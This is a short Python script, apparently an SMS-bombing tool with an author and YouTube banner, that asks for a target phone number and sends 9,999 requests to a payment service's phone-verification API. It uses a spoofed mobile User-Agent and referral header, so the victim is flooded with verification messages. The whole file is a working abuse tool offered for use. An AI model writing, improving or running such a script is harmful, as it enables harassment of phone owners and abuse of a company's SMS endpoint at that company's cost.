import json
import requests
import os
import sys


def main():
	os.system('clear')
	os.system('figlet PAYFAZZ')
	banner='''
 [+]AUTHOR: MAHENDRA  
 [+]YOUTUBE : TUTORIAL UTAMA
	'''
	print(banner)
	no = input('target : ')


	head = {
	"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",
	"Referer": "http://www.payfazz.com/register/BEN6ZF74XL",
	"Host": "api.payfazz.com",
	}


	dat = {
	'phone': no
	}

	for x in range (9999):
		leosureo = requests.post("https://api.payfazz.com/v2/phoneVerifications", headers=head, json=dat)
		if 'eror' in leosureo:
			print('gagal Mengirim ' + no)

		else:
			print('succes and 𝙋𝙚𝙣𝙙𝙞𝙣𝙜 ' + no)		

main()
